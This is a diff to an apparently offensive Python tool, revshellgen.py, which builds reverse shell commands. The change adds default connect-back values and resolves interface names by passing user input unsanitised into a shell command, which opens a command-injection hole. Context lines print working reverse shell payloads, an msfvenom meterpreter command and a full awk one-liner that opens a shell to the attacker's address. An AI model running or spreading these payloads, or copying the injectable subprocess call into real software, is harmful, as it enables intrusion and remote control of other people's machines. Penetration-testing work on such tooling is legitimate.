@@ -4,13 +4,15 @@ import argparse
 import socket
 import sys
 import time
+import re
+import subprocess 
 from base64 import b64encode
 
 def parse_options():
 
     parser = argparse.ArgumentParser(description='python revshellgen.py -i 127.0.0.1 -p 1234 -t bash')
-    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to")
-    parser.add_argument("-p", "--port", type=int, help="Port to connect back to")
+    parser.add_argument("-i", "--ipaddr", type=str, default="127.0.0.1", help="IP address or interface to connect back to")
+    parser.add_argument("-p", "--port", type=int, default=4444, help="Port to connect back to")
     parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate", dest='shell_type')
     parser.add_argument("-li", "--listen", action="store_true", help='Open a socket and listen for a shell')
     parser.add_argument("-ls", "--list", action="store_true", help="List available shell types", dest='shell_list')
@@ -24,12 +26,26 @@ def parse_options():
 def main(args):
 
     if args.ipaddr or args.port != None:
-        ipaddr = args.ipaddr
+        if len(args.ipaddr.split(".")) != 4:
+            try:
+                cmd = f"ip addr show dev {args.ipaddr}"
+                iface_info = subprocess.Popen(args=cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                #print(iface_info.stdout.read().decode())
+                ipaddr = re.search("inet\s((?:[\d]{1,3}.){3}\d{1,3})", iface_info.stdout.read().decode())
+               
+               #Check and set IP
+                if ipaddr == None:
+                    print(f"[X] {args.ipaddr} is not a valid interface name or ip address!")
+                    sys.exit(1337)
+                else:
+                    ipaddr = ipaddr[1]
+            except Exception as e:
+                print("[X]" + e)
+                sys.exit(31337)
+        else:
+            ipaddr = args.ipaddr
         port = args.port
-    else:
-        ipaddr = '127.0.0.1'
-        port = 1234
-
+    
     shells = {
         'asp':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f asp > revshell.asp' % (ipaddr, port),
         'awk':'awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (ipaddr, port),
